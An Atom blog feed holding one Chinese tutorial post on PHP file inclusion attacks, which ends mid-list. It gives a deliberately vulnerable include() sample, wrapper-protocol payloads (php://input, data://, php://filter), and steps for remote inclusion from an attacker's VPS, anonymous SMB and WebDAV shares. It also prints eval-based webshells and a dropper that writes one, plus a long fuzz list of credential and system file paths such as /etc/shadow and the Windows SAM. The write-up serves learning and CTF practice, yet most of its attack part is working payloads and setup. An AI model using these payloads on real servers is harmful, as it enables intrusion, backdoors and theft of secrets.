<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sakura</title>
  
  
  <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
  
  <link href="https://sakurahack-y.github.io/"/>
  <updated>2022-11-30T16:53:39.340Z</updated>
  <id>https://sakurahack-y.github.io/</id>
  
  <author>
    <name>sakura</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>php文件包含总结</title>
    <link href="https://sakurahack-y.github.io/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/</id>
    <published>2022-11-23T07:52:14.000Z</published>
    <updated>2022-11-30T16:53:39.340Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><ul><li>如果文件包含函数没有经过严格的过滤或者定义<br>并且参数可以被用户控制<br>这样就有可能包含非预期的文件。</li><li>如果文件中存在恶意代码，无论文件是什么类型<br>恶意代码都会被解析。</li><li>文件包含漏洞可能会造成服务器的网页被篡改，网站被挂马，服务器被远程控制，被安装后门等危害</li></ul><h1 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h1><p> PHP里面共有4个与文件包含相关的函数,分别是:</p><pre><code>include  requireinclude_oncerequire_once</code></pre><p>include和require函数的作用并没有太大的区别，这里就只放出include的说明</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123155546122.png" alt="image-20221123155546122"></p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123155609821.png" alt="image-20221123155609821"></p><h1 id="支持的协议和封装协议"><a href="#支持的协议和封装协议" class="headerlink" title="支持的协议和封装协议"></a>支持的协议和封装协议</h1><p>我们可以看到文件包含函数可以使用封装协议</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123155918249.png" alt="image-20221123155918249"></p><p><strong>支持的协议和封装协议</strong></p><pre><code class="php">•file:// — 访问本地文件系统•http:// — 访问 HTTP(s) 网址•ftp:// — 访问 FTP(s) URLs•php:// — 访问各个输入/输出流（I/O streams）•zlib:// — 压缩流•data:// — 数据（RFC 2397）•glob:// — 查找匹配的文件路径模式•phar:// — PHP 归档•ssh2:// — Secure Shell 2•rar:// — RAR•ogg:// — 音频流•expect:// — 处理交互式的流</code></pre><p>这里重点讲下常用的伪协议:</p><p>1.<code>file://</code><br> 这个协议可以展现本地文件系统,默认目录是当前的工作目录。</p><pre><code>file:///path/to/file.ext 在文件包含中其实也就是等价 /path/to/file.ext例如：file:///etc/passwd、file://key.txt但是如果来个题目给你来个正则匹配 ../ 或 / 开头的时候就可以用这个方法来绕过了。</code></pre><p>2.<code>php://</code><br> (1)<code>php://input</code>是个可以访问请求的原始数据的只读流<br> (2)<code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123160555145.png" alt="image-20221123160555145"></p><p>各种过滤器</p><pre><code class="php">(1)readfile(&quot;http://www.example.com&quot;);等价于readfile(&quot;php://filter/resource=http://www.example.com&quot;);  //这种写法等于没有设置过滤器(2)读取链file_get_contents(&quot;php://filter/read=convert.base64-encode/resource=test.php&quot;);写入链file_put_contents(&quot;php://filter/write=convert.base64-decode/resource=[file]&quot;,&quot;base64&quot;);这个点在ctf有时候会很有用,可以绕过一些waf</code></pre><p>(3)<code>php://input</code></p><pre><code class="php">可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。有自身局限性:allow_url_fopen :off/on (默认配置on)            allow_url_include:on (默认配置off)</code></pre><p>最后用一个表来总结:</p><table><thead><tr><th align="center">协议</th><th>测试php版本</th><th align="center">allow_url_fopen</th><th align="center">allow_url_include</th><th align="left">用法</th></tr></thead><tbody><tr><td align="center">file://</td><td>&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">?file=file://D:/soft/phpStudy/WWW/phpcode.txt</td></tr><tr><td align="center">php://filter</td><td>&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">?file=php://filter/read=convert.base64-encode/resource=./index.php</td></tr><tr><td align="center">php://input</td><td>&gt;=5.2</td><td align="center">off/on</td><td align="center">on</td><td align="left">?file=php://input  [POST DATA] <?php phpinfo()?></td></tr><tr><td align="center">zip://</td><td>&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">?file=zip://D:/soft/phpStudy/WWW/file.zip%23phpcode.txt</td></tr><tr><td align="center">compress.bzip2://</td><td>&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">?file=compress.bzip2://D:/soft/phpStudy/WWW/file.bz2 [or]   ?file=compress.bzip2://./file.bz2</td></tr><tr><td align="center">compress.zlib://</td><td>&gt;=5.2</td><td align="center">off/on</td><td align="center">off/on</td><td align="left">?file=compress.zlib://D:/soft/phpStudy/WWW/file.gz   [or]        ?file= compress.zlib://./file.gz</td></tr><tr><td align="center">data://</td><td>&gt;=5.2</td><td align="center">on</td><td align="center">on</td><td align="left">?file=data://text/plain,<?php phpinfo()?>  [or]                       ?file=data:text/plain,<?php phpinfo()?>    [or]                              [or]                                                                                                        data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=                                                            [or]                                                                                             data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</td></tr></tbody></table><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p>假设当前页面存在一个任意文件包含漏洞(无后缀限制),代码如下:</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type: text/html; charset=utf-8&quot;);$file = $_GET[&#39;file&#39;];include($file);?&gt;</code></pre><h2 id="利用各种伪协议读取文件"><a href="#利用各种伪协议读取文件" class="headerlink" title="利用各种伪协议读取文件"></a>利用各种伪协议读取文件</h2><p>1.<code>file</code></p><pre><code class="php">http://127.0.0.1/index.php?file=file://E:/phpstudy_pro/WWW/flag.php</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123171144477.png" alt="image-20221123171144477"></p><p>2.<code>php://filter</code></p><pre><code class="php">http://127.0.0.1/index.php?file=php://filter/read=convert.base64-encode/resource=./index.php</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123171244526.png" alt="image-20221123171244526"></p><p>过程: 读取文件内容-&gt;base64编码-&gt;php不解析-&gt;显示base64编码</p><h2 id="GetShell思路"><a href="#GetShell思路" class="headerlink" title="GetShell思路"></a>GetShell思路</h2><h3 id="allow-url-include-开启的情况"><a href="#allow-url-include-开启的情况" class="headerlink" title="allow_url_include 开启的情况"></a>allow_url_include 开启的情况</h3><p><code>allow_url_include</code> 默认环境在php5.2之后默认为off,所以说这个用法比较鸡肋,但是平时在看phpinfo的时候可以查看下这个是否开启。</p><p><code>allow_url_fopen</code> 默认开启,所以我们可以通过利用远程url或者<code>php://</code>协议直接getshell</p><p>只有当allow_url_fopen=On和allow_url_include=On时，include等其他包含函数才会将URL代表的文件包含执行</p><p><strong>1.</strong></p><pre><code class="php">http://127.0.0.1/index.php?file=http://remote.com/shell.txt</code></pre><p>我们可以在vps上使用python快速开启一个http服务:</p><pre><code>python2 -m SimpleHTTPServer portpython3 -m http.server port</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123172420851.png" alt="image-20221123172420851"></p><p>我在里面放了一个文件内容是</p><pre><code class="php">&lt;?php phpinfo();?&gt;</code></pre><p>我们来包含一下:</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123173149452.png" alt="image-20221123173149452"></p><p><strong>2.</strong></p><pre><code class="php">http://127.0.0.1/index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123174036937.png" alt="image-20221123174036937"></p><p><strong>3.</strong></p><pre><code class="php">http://127.0.0.1/index.php?file=php://input PostData:&lt;?php phpinfo();?&gt;</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221123173745729.png" alt="image-20221123173745729"></p><h3 id="allow-url-include-关闭双off的情况-window环境下"><a href="#allow-url-include-关闭双off的情况-window环境下" class="headerlink" title="allow_url_include 关闭双off的情况(window环境下)"></a>allow_url_include 关闭双off的情况(window环境下)</h3><p>此时我们来包含下远程文件:</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221124153732695.png" alt="image-20221124153732695"></p><p>不过就算 <code>allow_url_include</code> and <code>allow_url_fopen</code>均为off 在<strong>window主机环境</strong>下仍然可以进行远程文件执行</p><blockquote><p>1：什么是UNC路径？UNC路径就是类似\softer这样的形式的网络路径。<br> 2：UNC为网络（主要指局域网）上资源的完整Windows 2000名称。 注意主要这个字,所以说也支持远程网络<br> 格式：\servername\sharename，其中servername是服务器名。sharename是共享资源的名称。<br> 目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename。<br> 2：unc共享就是指<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%A1%AC%E7%9B%98">网络硬盘</a>的共享</p></blockquote><p>因为 <code>allow_url_include</code> 为off的时候,php不会加载远程的http 或者 ftp的url,但是没有禁止SMB的URL加载。</p><p>因为SMB share服务器需要用UNC路径去访问,而Linux没有UNC路径所以这种方法只能在window下利用</p><h4 id="利用1-UNC-gt-SMB"><a href="#利用1-UNC-gt-SMB" class="headerlink" title="利用1: UNC-&gt;SMB"></a>利用1: UNC-&gt;SMB</h4><p><strong>攻击场景</strong></p><p>当易受攻击的PHP应用程序代码尝试从受攻击者控制的SMB共享加载PHP Web  shell时，SMB共享应该允许访问该文件。攻击者需要在其上配置具有匿名浏览访问权限的SMB服务器。因此，一旦易受攻击的应用程序尝试从SMB共享访问PHP Web shell，SMB服务器将不会要求任何凭据，易受攻击的应用程序将包含Web shell的PHP代码。  </p><p><strong>利用过程:</strong></p><p>在vps上安装samba服务</p><p>依次执行以下命令:</p><pre><code class="shell">apt-get remove -y samba* 卸载 smaba 相关的软件apt-get install samba  //安装SAMBA服务器或者yum install -y samba*mkdir /var/www/html/pub/    //创建SMB共享目录chmod 0555 /var/www/html/pub/chown -R nobody:nogroup /var/www/html/pub/   //配置新创建的SMB共享目录的权限echo &gt; /etc/samba/smb.conf     //删除SAMBA服务器配置文件的默认内容</code></pre><p>将下面的内容放在<code>/etc/samba/smb.conf</code>文件中</p><pre><code class="shell">[global]workgroup = WORKGROUPserver string = Samba Server %vnetbios name = indishell-labsecurity = usermap to guest = bad username resolve order = bcast hostdns proxy = nobind interfaces only = yes[ethan]path = /var/www/html/pubwritable = noguest ok = yesguest only = yesread only = yesdirectory mode = 0555force user = nobody</code></pre><p>重新启动SAMBA服务器以应用配置文件<code>/etc/samba/smb.conf</code>中的新配置 </p><pre><code class="shell">service smbd restart </code></pre><p>成功重新启动SAMBA服务器后，尝试访问SMB共享并确保SAMBA服务器不要求凭据。(我曾尝试用centos7去搭建这个服务，但是一直无法尝试成功，可能性有多种，最终我选择了本地搭建这个服务来作为示范)</p><pre><code>\\192.168.1.104\</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221124153244103.png" alt="image-20221124153244103"></p><p>我们在这个里面放入一个文件，里面内容为:</p><pre><code class="php">&lt;?php phpinfo();?&gt;  // &lt;?php @eval($_POST[&#39;admin&#39;]);?&gt;</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221124153615623.png" alt="image-20221124153615623"></p><p>我们再来包含一下这个文件:</p><pre><code class="php">http://127.0.0.1/index.php?file=\\192.168.1.104\ethan\hy.txt</code></pre><p>我们惊讶的发现竟然又可以进行远程文件包含了</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221124153911758.png" alt="image-20221124153911758"></p><p>这个方法确实十分巧妙!</p><h4 id="利用2-UNC-gt-webdav"><a href="#利用2-UNC-gt-webdav" class="headerlink" title="利用2:UNC-&gt;webdav"></a>利用2:UNC-&gt;webdav</h4><blockquote><p>WebDAV （Web-based Distributed Authoring and Versioning） 一种基于 HTTP 1.1协议的通信协议。<br>它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，<br>使应用程序可对Web Server直接读写，<br>并支持写文件锁定(Locking)及解锁(Unlock)，<br>还可以支持文件的版本控制。</p></blockquote><p><strong>攻击场景</strong></p><p>当易受攻击的PHP应用程序代码尝试从攻击者控制的WebDAV服务器共享加载PHP Web  shell时，WebDAV共享应该允许访问该文件。攻击者需要在其上配置具有匿名浏览访问权限的WebDAV服务器。因此，一旦易受攻击的应用程序尝试从WebDAV共享访问PHP Web shell，WebDAV服务器将不会要求任何凭据，易受攻击的应用程序将包含Web shell的PHP代码。</p><p><strong>利用:</strong></p><p>需要使用匿名读取访问权限配置WebDAV服务器。</p><pre><code class="shell">sudo apt-get install -y apache2  //安装Apache Web服务器sudo a2enmod davsudo a2enmod dav_fs  //在Apache配置中启用WebDAV模块sudo mkdir -p /var/www/html/webdavsudo touch /var/www/html/webdav/shell.php  //创建WebDAV共享目录webdav和 php web shellsudo chown -R www-data:www-data  /var/www/    //将文件夹所有者更改为您的Apache用户，www-data以便Apache具有对该文件夹的写访问权</code></pre><p>编辑WebDAV配置文件</p><pre><code class="shell">/etc/apache2/sites-available/000-default.conf</code></pre><p>不需要启用身份验证:</p><pre><code class="shell">DavLockDB /var/www/html/DavLock&lt;VirtualHost *:80&gt;    # The ServerName directive sets the request scheme, hostname and port that    # the server uses to identify itself. This is used when creating    # redirection URLs. In the context of virtual hosts, the ServerName    # specifies what hostname must appear in the request&#39;s Host: header to    # match this virtual host. For the default virtual host (this file) this    # value is not decisive as it is used as a last resort host regardless.    # However, you must set it for any further virtual host explicitly.    #ServerName www.example.com    ServerAdmin webmaster@localhost    DocumentRoot /var/www/html    # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,    # error, crit, alert, emerg.    # It is also possible to configure the loglevel for particular    # modules, e.g.    #LogLevel info ssl:warn    ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log    CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined    # For most configuration files from conf-available/, which are    # enabled or disabled at a global level, it is possible to    # include a line for only one particular virtual host. For example the    # following line enables the CGI configuration for this host only    # after it has been globally disabled with &quot;a2disconf&quot;.    #Include conf-available/serve-cgi-bin.conf    Alias /webdav /var/www/html/webdav     &lt;Directory /var/www/html/webdav&gt;         DAV On     &lt;/Directory&gt;&lt;/VirtualHost&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noet</code></pre><p>重新启动Apache服务器，以使更改生效:</p><pre><code class="shell">sudo service apache2 restart</code></pre><p>还可以使用docker搭建:</p><pre><code class="shell">docker pull https://hub.docker.com/r/bytemark/webdav  //拉取webdav镜像docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav  //用docker启动一个webdav服务器</code></pre><p>我们可以在shell.php中写入:</p><pre><code class="php">&lt;?php echo eval(system(&quot;whoami&quot;));phpinfo();?&gt;&lt;?PHP fputs(fopen(&#39;poc.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[Qftm])?&gt;&#39;);?&gt;</code></pre><p>为什么这个不能直接加载一句话木马呢，因为使用PHP文件包含函数远程加载Webdav共享文件时，不能附加消息(GET/POST)，但是我们可以自定义<code>shell.php</code>，通过服务器加载远程<code>shell.php</code>给我们自动生成一个<code>Webshell</code>。</p><p>请求构造的payload</p><pre><code>127.0.0.1/index.php?file=//193.43.142.8//webdav/shell.php</code></pre><p>我这里一直没有复现成功，就用别的大佬的图吧:</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125014318694.png" alt="image-20221125014318694"></p><p>从图中可以看到远程加载<code>shell.php</code>利用成功，可以根据状态码分析其加载过程：</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125014333601.png" alt="image-20221125014333601"></p><p>其中<code>code 207</code>是由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</p><h3 id="尝试包含日志文件、环境文件等可控文件"><a href="#尝试包含日志文件、环境文件等可控文件" class="headerlink" title="尝试包含日志文件、环境文件等可控文件"></a>尝试包含日志文件、环境文件等可控文件</h3><p>这种利用方式其实在实战中是比较鸡肋的,因为默认的权限是不允许访问的,但是可以去尝试下。</p><p>不过如果主机是window系统,像phpstudy那种一键安装的都具有高权限,完全可以通过包含一些文件来getshell。</p><h4 id="Linux-系统"><a href="#Linux-系统" class="headerlink" title="Linux 系统"></a>Linux 系统</h4><p>一般在Linux系统下通过<code>apt-get install apache2</code> 默认安装的apache 或者nginx都没有权限访问这些文件</p><p>关于linux权限问题可以参考鸟哥文章</p><pre><code class="shell">root@VM-221-25-ubuntu:/var/log# ls -ll /var/log/apache2/access.log-rw-r----- 1 root adm 0 May 18 06:25 /var/log/apache2/access.logroot@VM-221-25-ubuntu:/var/log# ls -ll /var/log/nginx/access.log-rw-r----- 1 www-data adm 0 May 18 06:25 /var/log/nginx/access.logroot@VM-221-25-ubuntu:/var/log# ls -ll /var/log/drwxr-xr-x 2 root   adm           4096 May 18 06:25 nginx</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125191115735.png" alt="image-20221125191115735"></p><p>这里以<code>/var/log/apache2/access.log</code>为例子,文件拥有者为root，所属群组为adm,root用户可以<code>rw-</code>,同群组用户<code>r—</code>只可以读。</p><p>而我们的php和apache2进程的user一般是<code>www-data</code></p><pre><code>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologinroot@VM-221-25-ubuntu:/var/log# groups www-data #查看用户所属的组www-data : www-data</code></pre><p>所以说没办法访问到这些文件达到RCE目的,但是有时候有些管理员会因为方便等问题导致权限配置错误。</p><p>我们可以收集下常见路径，然后进行fuzz</p><pre><code class="shell">Linux:/etc/passwd/etc/shadow/etc/fstab/etc/host.conf/etc/motd/etc/ld.so.conf/var/www/htdocs/index.php/var/www/conf/httpd.conf/var/www/htdocs/index.html/var/httpd/conf/php.ini/var/httpd/htdocs/index.php/var/httpd/conf/httpd.conf/var/httpd/htdocs/index.html/var/httpd/conf/php.ini/var/www/index.html/var/www/index.php/opt/www/conf/httpd.conf/opt/www/htdocs/index.php/opt/www/htdocs/index.html/usr/local/apache/htdocs/index.html/usr/local/apache/htdocs/index.php/usr/local/apache2/htdocs/index.html/usr/local/apache2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.html/tmp/apache/htdocs/index.html/tmp/apache/htdocs/index.php/etc/httpd/htdocs/index.php/etc/httpd/conf/httpd.conf/etc/httpd/htdocs/index.html/www/php/php.ini/www/php4/php.ini/www/php5/php.ini/www/conf/httpd.conf/www/htdocs/index.php/www/htdocs/index.html/usr/local/httpd/conf/httpd.conf/apache/apache/conf/httpd.conf/apache/apache2/conf/httpd.conf/etc/apache/apache.conf/etc/apache2/apache.conf/etc/apache/httpd.conf/etc/apache2/httpd.conf/etc/apache2/vhosts.d/00_default_vhost.conf/etc/apache2/sites-available/default/etc/phpmyadmin/config.inc.php/etc/mysql/my.cnf/etc/httpd/conf.d/php.conf/etc/httpd/conf.d/httpd.conf/etc/httpd/logs/error_log/etc/httpd/logs/error.log/etc/httpd/logs/access_log/etc/httpd/logs/access.log/home/apache/conf/httpd.conf/home/apache2/conf/httpd.conf/var/log/apache/error_log/var/log/apache/error.log/var/log/apache/access_log/var/log/apache/access.log/var/log/apache2/error_log/var/log/apache2/error.log/var/log/apache2/access_log/var/log/apache2/access.log/var/www/logs/error_log/var/www/logs/error.log/var/www/logs/access_log/var/www/logs/access.log/usr/local/apache/logs/error_log/usr/local/apache/logs/error.log/usr/local/apache/logs/access_log/usr/local/apache/logs/access.log/var/log/error_log/var/log/error.log/var/log/access_log/var/log/access.log/usr/local/apache/logs/access_logaccess_log.old/usr/local/apache/logs/error_logerror_log.old/etc/php.ini/bin/php.ini/etc/init.d/httpd/etc/init.d/mysql/etc/httpd/php.ini/usr/lib/php.ini/usr/lib/php/php.ini/usr/local/etc/php.ini/usr/local/lib/php.ini/usr/local/php/lib/php.ini/usr/local/php4/lib/php.ini/usr/local/php4/php.ini/usr/local/php4/lib/php.ini/usr/local/php5/lib/php.ini/usr/local/php5/etc/php.ini/usr/local/php5/php5.ini/usr/local/apache/conf/php.ini/usr/local/apache/conf/httpd.conf/usr/local/apache2/conf/httpd.conf/usr/local/apache2/conf/php.ini/etc/php4.4/fcgi/php.ini/etc/php4/apache/php.ini/etc/php4/apache2/php.ini/etc/php5/apache/php.ini/etc/php5/apache2/php.ini/etc/php/php.ini/etc/php/php4/php.ini/etc/php/apache/php.ini/etc/php/apache2/php.ini/web/conf/php.ini/usr/local/Zend/etc/php.ini/opt/xampp/etc/php.ini/var/local/www/conf/php.ini/var/local/www/conf/httpd.conf/etc/php/cgi/php.ini/etc/php4/cgi/php.ini/etc/php5/cgi/php.ini/php5/php.ini/php4/php.ini/php/php.ini/PHP/php.ini/apache/php/php.ini/xampp/apache/bin/php.ini/xampp/apache/conf/httpd.conf/NetServer/bin/stable/apache/php.ini/home2/bin/stable/apache/php.ini/home/bin/stable/apache/php.ini/var/log/mysql/mysql-bin.log/var/log/mysql.log/var/log/mysqlderror.log/var/log/mysql/mysql.log/var/log/mysql/mysql-slow.log/var/mysql.log/var/lib/mysql/my.cnf/usr/local/mysql/my.cnf/usr/local/mysql/bin/mysql/etc/mysql/my.cnf/etc/my.cnf/usr/local/cpanel/logs/usr/local/cpanel/logs/stats_log/usr/local/cpanel/logs/access_log/usr/local/cpanel/logs/error_log/usr/local/cpanel/logs/license_log/usr/local/cpanel/logs/login_log/usr/local/cpanel/logs/stats_log/usr/local/share/examples/php4/php.ini/usr/local/share/examples/php/php.iniwindows:c:\windows\php.inic:\boot.inic:\1.txtc:\a.txtc:\CMailServer\config.inic:\CMailServer\CMailServer.exec:\CMailServer\WebMail\index.aspc:\program files\CMailServer\CMailServer.exec:\program files\CMailServer\WebMail\index.aspC:\WinWebMail\SysInfo.iniC:\WinWebMail\Web\default.aspC:\WINDOWS\FreeHost32.dllC:\WINDOWS\7i24iislog4.exeC:\WINDOWS\7i24tool.exec:\hzhost\databases\url.aspc:\hzhost\hzclient.exeC:\Documents and Settings\All Users\「开始」菜单\程序\7i24虚拟主机管理平台\自动设置[受控端].lnkC:\Documents and Settings\All Users\「开始」菜单\程序\Serv-U\Serv-U Administrator.lnkC:\WINDOWS\web.configc:\web\index.htmlc:\www\index.htmlc:\WWWROOT\index.htmlc:\website\index.htmlc:\web\index.aspc:\www\index.aspc:\wwwsite\index.aspc:\WWWROOT\index.aspc:\web\index.phpc:\www\index.phpc:\WWWROOT\index.phpc:\WWWsite\index.phpc:\web\default.htmlc:\www\default.htmlc:\WWWROOT\default.htmlc:\website\default.htmlc:\web\default.aspc:\www\default.aspc:\wwwsite\default.aspc:\WWWROOT\default.aspc:\web\default.phpc:\www\default.phpc:\WWWROOT\default.phpc:\WWWsite\default.phpC:\Inetpub\wwwroot\pagerror.gifc:\windows\notepad.exec:\winnt\notepad.exeC:\Program Files\Microsoft Office\OFFICE10\winword.exeC:\Program Files\Microsoft Office\OFFICE11\winword.exeC:\Program Files\Microsoft Office\OFFICE12\winword.exeC:\Program Files\Internet Explorer\IEXPLORE.EXEC:\Program Files\winrar\rar.exeC:\Program Files\360\360Safe\360safe.exeC:\Program Files\360Safe\360safe.exeC:\Documents and Settings\Administrator\Application Data\360Safe\360Examine\360Examine.logc:\ravbin\store.inic:\rising.iniC:\Program Files\Rising\Rav\RsTask.xmlC:\Documents and Settings\All Users\Start Menu\desktop.iniC:\Documents and Settings\Administrator\My Documents\Default.rdpC:\Documents and Settings\Administrator\Cookies\index.datC:\Documents and Settings\Administrator\My Documents\新建 文本文档.txtC:\Documents and Settings\Administrator\桌面\新建 文本文档.txtC:\Documents and Settings\Administrator\My Documents\1.txtC:\Documents and Settings\Administrator\桌面\1.txtC:\Documents and Settings\Administrator\My Documents\a.txtC:\Documents and Settings\Administrator\桌面\a.txtC:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Blue hills.jpgE:\Inetpub\wwwroot\aspnet_client\system_web\1_1_4322\SmartNav.htmC:\Program Files\RhinoSoft.com\Serv-U\Version.txtC:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.iniC:\Program Files\Symantec\SYMEVENT.INFC:\Program Files\Microsoft SQL Server\80\Tools\Binn\sqlmangr.exeC:\Program Files\Microsoft SQL Server\MSSQL\Data\master.mdfC:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\Data\master.mdfC:\Program Files\Microsoft SQL Server\MSSQL.2\MSSQL\Data\master.mdfC:\Program Files\Microsoft SQL Server\80\Tools\HTML\database.htmC:\Program Files\Microsoft SQL Server\MSSQL\README.TXTC:\Program Files\Microsoft SQL Server\90\Tools\Bin\DdsShapes.dllC:\Program Files\Microsoft SQL Server\MSSQL\sqlsunin.iniC:\MySQL\MySQL Server 5.0\my.iniC:\Program Files\MySQL\MySQL Server 5.0\my.iniC:\Program Files\MySQL\MySQL Server 5.0\data\mysql\user.frmC:\Program Files\MySQL\MySQL Server 5.0\COPYINGC:\Program Files\MySQL\MySQL Server 5.0\share\mysql_fix_privilege_tables.sqlC:\Program Files\MySQL\MySQL Server 4.1\bin\mysql.exec:\MySQL\MySQL Server 4.1\bin\mysql.exec:\MySQL\MySQL Server 4.1\data\mysql\user.frmC:\Program Files\Oracle\oraconfig\Lpk.dllC:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\aspnet_state.exeC:\WINDOWS\system32\inetsrv\w3wp.exeC:\WINDOWS\system32\inetsrv\inetinfo.exeC:\WINDOWS\system32\inetsrv\MetaBase.xmlC:\WINDOWS\system32\inetsrv\iisadmpwd\achg.aspC:\WINDOWS\system32\config\default.LOGC:\WINDOWS\system32\config\samC:\WINDOWS\system32\config\systemc:\CMailServer\config.inic:\program files\CMailServer\config.inic:\tomcat6\tomcat6\bin\version.shc:\tomcat6\bin\version.shc:\tomcat\bin\version.shc:\program files\tomcat6\bin\version.shC:\Program Files\Apache Software Foundation\Tomcat 6.0\bin\version.shc:\Program Files\Apache Software Foundation\Tomcat 6.0\logs\isapi_redirect.logc:\Apache2\Apache2\bin\Apache.exec:\Apache2\bin\Apache.exec:\Apache2\php\license.txtC:\Program Files\Apache Group\Apache2\bin\Apache.exec:\Program Files\QQ2007\qq.exec:\Program Files\Tencent\qq\User.dbc:\Program Files\Tencent\qq\qq.exec:\Program Files\Tencent\qq\bin\qq.exec:\Program Files\Tencent\qq2009\qq.exec:\Program Files\Tencent\qq2008\qq.exec:\Program Files\Tencent\qq2010\bin\qq.exec:\Program Files\Tencent\qq\Users\All Users\Registry.dbC:\Program Files\Tencent\TM\TMDlls\QQZip.dllc:\Program Files\Tencent\Tm\Bin\Txplatform.exec:\Program Files\Tencent\RTXServer\AppConfig.xmlC:\Program Files\Foxmal\Foxmail.exeC:\Program Files\Foxmal\accounts.cfgC:\Program Files\tencent\Foxmal\Foxmail.exeC:\Program Files\tencent\Foxmal\accounts.cfgC:\Program Files\LeapFTP 3.0\LeapFTP.exeC:\Program Files\LeapFTP\LeapFTP.exec:\Program Files\GlobalSCAPE\CuteFTP Pro\cftppro.exec:\Program Files\GlobalSCAPE\CuteFTP Pro\notes.txtC:\Program Files\FlashFXP\FlashFXP.iniC:\Program Files\FlashFXP\flashfxp.exec:\Program Files\Oracle\bin\regsvr32.exec:\Program Files\腾讯游戏\QQGAME\readme.txtc:\Program Files\tencent\腾讯游戏\QQGAME\readme.txtc:\Program Files\tencent\QQGAME\readme.txtC:\Program 